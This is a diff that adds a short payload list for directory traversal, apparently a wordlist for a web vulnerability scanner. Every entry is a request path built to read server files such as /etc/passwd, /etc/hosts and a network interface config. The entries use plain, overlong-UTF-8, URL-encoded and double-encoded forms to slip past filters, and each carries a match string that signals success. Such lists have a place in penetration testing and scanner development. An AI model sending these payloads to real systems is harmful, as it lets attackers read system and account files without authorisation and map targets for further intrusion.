@@ -1,0 +1,13 @@
+# Directory traversal
+
+/../../../../../../../../../../../../../etc/passwd    {tag="root:x:"}
+/../../../../../../../../../../../../../etc/hosts     {tag="127.0.0.1"}
+/../../../../../../../../../../../../../etc/sysconfig/network-scripts/ifcfg-eth1    {tag="GATEWAY="}
+/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/hosts    {tag="127.0.0.1"}
+/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd    {tag="root:x:"}
+/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd                    {tag="root:x:"}
+/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd    {tag="root:x:"}
+//././././././././././././././././././././././././../../../../../../../../etc/passwd              {tag="root:x:"}
+/etc/passwd    {tag="root:x:"}
+/etc/hosts     {tag="127.0.0.1"}
+/aa/../../cc/../../bb/../../dd/../../aa/../../cc/../../bb/../../dd/../../bb/../../dd/../../bb/../../dd/../../bb/../../dd/../../ee/../../etc/hosts   {status=200}  {tag="127.0.0.1"}
